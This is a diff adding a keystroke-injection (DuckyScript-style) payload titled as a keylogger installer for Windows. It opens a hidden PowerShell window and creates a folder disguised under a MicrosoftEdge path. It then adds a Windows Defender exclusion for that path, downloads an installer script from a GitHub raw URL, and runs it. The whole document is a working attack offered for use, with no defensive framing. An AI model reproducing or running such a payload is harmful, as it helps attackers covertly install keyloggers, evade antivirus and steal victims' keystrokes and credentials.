@@ -1,0 +1,21 @@
+REM Title: MirozoKeyloggerInstallInstallationScriptAndLaunchIt
+REM Target: Windows with WindowsDefender
+REM Author: Mirozo
+DELAY 500
+GUI r
+DELAY 50
+STRING powershell -WindowStyle hidden
+ENTER
+DELAY 100
+STRING New-Item -ItemType Directory -Path $env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\
+DELAY 50
+ENTER
+STRING Set-MpPreference -ExclusionPath $env:LOCALAPPDATA\MicrosoftEdge\ -Recurse
+ENTER
+DELAY 50
+STRING Invoke-WebRequest -URL https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/installer.ps1 -OutFile $env:TEMP\G8vGMjXDhui78YqB.ps1
+ENTER
+DELAY 50
+STRING Start-Process -FilePath $env:TEMP\G8vGMjXDhui78YqB.ps1
+ENTER
+DELAY 50
